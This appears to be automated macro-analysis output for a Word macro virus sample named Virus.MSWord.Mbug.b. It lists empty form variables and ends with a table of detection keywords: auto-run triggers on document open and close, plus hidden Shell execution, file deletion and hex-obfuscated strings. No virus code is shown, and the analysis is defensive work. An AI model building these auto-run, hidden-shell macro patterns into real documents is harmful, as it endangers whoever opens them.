VBA FORM Variable "b'Label2'" IN 'Virus.MSWord.Mbug.b' - OLE stream: 'Macros/UserForm1'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'Label3'" IN 'Virus.MSWord.Mbug.b' - OLE stream: 'Macros/UserForm1'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'Label4'" IN 'Virus.MSWord.Mbug.b' - OLE stream: 'Macros/UserForm1'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'Label5'" IN 'Virus.MSWord.Mbug.b' - OLE stream: 'Macros/UserForm1'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'Label6'" IN 'Virus.MSWord.Mbug.b' - OLE stream: 'Macros/UserForm1'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'CommandButton1'" IN 'Virus.MSWord.Mbug.b' - OLE stream: 'Macros/UserForm1'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'CommandButton2'" IN 'Virus.MSWord.Mbug.b' - OLE stream: 'Macros/UserForm1'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoExec            |Runs when the Word document is opened        |
|AutoExec  |AutoClose           |Runs when the Word document is closed        |
|AutoExec  |CommandButton1_Click|Runs when the file is opened and ActiveX     |
|          |                    |objects trigger events                       |
|Suspicious|Kill                |May delete a file                            |
|Suspicious|Shell               |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|vbHide              |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|vbMinimizedFocus    |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|windows             |May enumerate application windows (if        |
|          |                    |combined with Shell.Application object)      |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
+----------+--------------------+---------------------------------------------+

